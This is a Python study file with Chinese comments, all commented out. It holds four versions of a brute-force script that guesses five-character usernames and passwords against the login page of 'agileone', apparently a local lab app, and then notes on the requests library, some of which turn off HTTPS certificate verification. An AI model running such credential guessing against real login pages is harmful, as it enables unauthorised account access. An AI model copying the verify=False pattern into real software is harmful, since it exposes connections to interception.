#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2019/5/8 14:10
# @Author  : cui
# @File    : violence_01.py
import requests
from random import sample,choices
# #暴力破解
# class Agileone:
#     def login(self):
#         tuple1 = ('a','d','m','i','n','q')#账号未知的可能包含字符，假设账号密码都是5位
#         while True:
#             indexs = sample(range(0, 5), 5)
#             indexs2 = sample(range(0, 5), 5)
#             str1 = tuple1[indexs[0]] + tuple1[indexs[1]] + tuple1[indexs[2]] + tuple1[indexs[3]] + tuple1[indexs[4]]
#             str2 = tuple1[indexs2[0]] + tuple1[indexs2[1]] + tuple1[indexs2[2]] + tuple1[indexs2[3]] + tuple1[indexs2[4]]
#             parameters = {'username':'%s' %str1,'password':'%s' %str2,'savelogin':'true' }
#             response = requests.post('http://cuishao/agileone/index.php/common/login',parameters)
#             result = response.text
#             if result == 'successful':
#                 print('破解成功！账号：%s,密码：%s' %(str1,str2))
#                 break
#             else:
#                 print('破解失败！账号：%s,密码：%s' % (str1, str2))
#
# if __name__ == '__main__':
#     Agileone().login()
###################################
# class Agileone:
#     def login(self):
#         tuple1 = ('a','d','m','i','n','q')#账号未知的可能包含字符，假设账号密码都是5位
#         flag = 0#如果等于1说明用户名正确
#         indexs = []
#         while True:
#             if flag == 1:
#                 pass
#             else:
#                 indexs = sample(range(0, 5), 5)
#             indexs2 = sample(range(0, 5), 5)
#             str1 = tuple1[indexs[0]] + tuple1[indexs[1]] + tuple1[indexs[2]] + tuple1[indexs[3]] + tuple1[indexs[4]]
#             str2 = tuple1[indexs2[0]] + tuple1[indexs2[1]] + tuple1[indexs2[2]] + tuple1[indexs2[3]] + tuple1[indexs2[4]]
#             parameters = {'username':'%s' %str1,'password':'%s' %str2,'savelogin':'true' }
#             response = requests.post('http://cuishao/agileone/index.php/common/login',parameters)
#             result = response.text
#             if result == 'successful':
#                 print('破解成功！账号：%s,密码：%s' %(str1,str2))
#                 break
#             elif result == 'password_invalid':
#                 flag = 1
#             else:
#                 print('破解失败！账号：%s,密码：%s' % (str1, str2))
#
# if __name__ == '__main__':
#     Agileone().login()
#################################
# class Agileone:
#     def login(self):
#         tuple1 = ('a','d','m','i','n','q')#账号未知的可能包含字符，假设账号密码都是5位
#         flag = 0#如果等于1说明用户名正确
#         str1 = []
#         while True:
#             if flag == 1:
#                 pass
#             else:
#                 str1 = ''.join(choices(tuple1,k=5))#从集合里面随机取5个元素，前后元素可以重复
#             str2 = ''.join(choices(tuple1, k=5))
#             parameters = {'username':'%s' %str1,'password':'%s' %str2,'savelogin':'true' }
#             response = requests.post('http://cuishao/agileone/index.php/common/login',parameters)
#             result = response.text
#             if result == 'successful':
#                 print('破解成功！账号：%s,密码：%s' %(str1,str2))
#                 break
#             elif result == 'password_invalid':
#                 flag = 1
#             else:
#                 print('破解失败！账号：%s,密码：%s' % (str1, str2))
#
# if __name__ == '__main__':
#     Agileone().login()
##########################
# class Agileone:
#     def login(self):
#         tuple1 = ('a','d','m','i','n','q')#账号未知的可能包含字符，假设账号密码都是5位
#         flag = 0#如果等于1说明用户名正确
#         username = []#存储正确的用户名
#         for i in tuple1:
#             for j in tuple1:
#                 for k in tuple1:
#                     for h in tuple1:
#                         for m in tuple1:
#                             str1 = i + j + k + h + m
#                             parameters = {'username':'%s' %str1,'password':'','savelogin':'true' }
#                             response = requests.post('http://cuishao/agileone/index.php/common/login',parameters)
#                             result = response.text
#                             if result == 'password_invalid':
#                                 print('用户名破解成功！账号：%s' %str1)
#                                 username = str1
#                                 for i1 in tuple1:
#                                     for j1 in tuple1:
#                                         for k1 in tuple1:
#                                             for h1 in tuple1:
#                                                 for m1 in tuple1:
#                                                     str2 = i1 + j1 + k1 + h1 + m1
#                                                     parameters = {'username': username, 'password': '%s' %str2,
#                                                                   'savelogin': 'true'}
#                                                     response = requests.post(
#                                                         'http://cuishao/agileone/index.php/common/login', parameters)
#                                                     result = response.text
#                                                     if result == 'successful':
#                                                         print('破解成功！账号：%s,密码：%s' %(username,str2))
#                                                         return
#                                                     else:
#                                                         print('破解失败！账号：%s,密码：%s' % (username, str2))
#                             else:
#                                 print('用户名破解失败！账号：%s' %str1)
#
# if __name__ == '__main__':
#     Agileone().login()

#################################
# 文件下载
# import requests
# resp = requests.post('http://www.woniuxy.com/page/img/banner/PBET%206.0-home.jpg')
# with open('home.jpg','wb') as f:
#     f.write(resp.content)
###########
# 文件上传
# import requests
# 文件上传:agileone,缺陷管理-文件上传
# Content-Type: multipart/form-data(可以二进制传输)、application/x-www-form-urlencoded（默认方式，纯文本，不能以二进制传输）
# import requests
# upload_file = {'fileToUpload':('testhome.png',open('home.jpg','rb'))}
# session = requests.Session()
# session.post('http://cuishao/agileone/index.php/common/login',{'username':'admin','password':'admin','savelogin':'true'})
# resp = session.post('http://cuishao/agileone/index.php/attach/upload/refertype/defect/referid/13',files = upload_file)
# print(resp.text)
#
# param = {'username':'admin','password':'admin','savelogin':'true'}
# resp = requests.post('http://cuishao/agileone/index.php/common/login',param)
# #响应正文
# print(resp.text)
# print(resp.content)#二进制
# #响应头
# print(resp.headers)
# #响应状态码
# print(resp.status_code)
# #响应cookie
# print(resp.cookies)
# #响应正文：来自服务器的原始套接字
# print(resp.raw)
# # 用json解码器处理后的响应正文数据
# print(resp.json())#非字典类型输入不支持


#json响应内容

# import requests
# resp = requests.get('https://github.com/timeline.json',verify=False)
# print(resp.json())
# content = resp.json()
# print(content['documentation_url'])



#cookie,session

# param = {'username':'admin','password':'admin','savelogin':'true'}
# head = {'Content-Type':'application/x-www-form-urlencoded'}#可有可无
# resp = requests.post('http://qzx/agileone/index.php/common/login',param,head)
# print(resp.text)
# print(resp.cookies)
# print(resp.cookies['PHPSESSID'])


#重定向

# resp = requests.get('http://qzx/agileone',allow_redirects = True)
# print(resp.text.encode('utf8'))

#https协议接口agileone


#使用requests访问https,verify=False标识忽略证书
#在访问某些外部http或https时，可能会出现403 Forbidden的错误，在请求头中加入字典内容{'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36'}
# import requests
# param = {'username':'admin','password':'admin','savelogin':'true'}
# resp = requests.post(url='https://qzx/agileone/index.php/common/login',data=param,verify=False)
# print(resp.text)
# #使用urllib结合ssl访问https,不推荐
# import urllib.request,ssl
# ssl._create_default_https_context = ssl._create_unverified_context
# param = {'username':'admin','password':'admin','savelogin':'true'}
# resp = urllib.request.urlopen(url='https://qzx/agileone/index.php/common/login',data=urllib.parse.urlencode(param).encode('utf8'))
# print(resp.read().decode('utf8'))
# '''


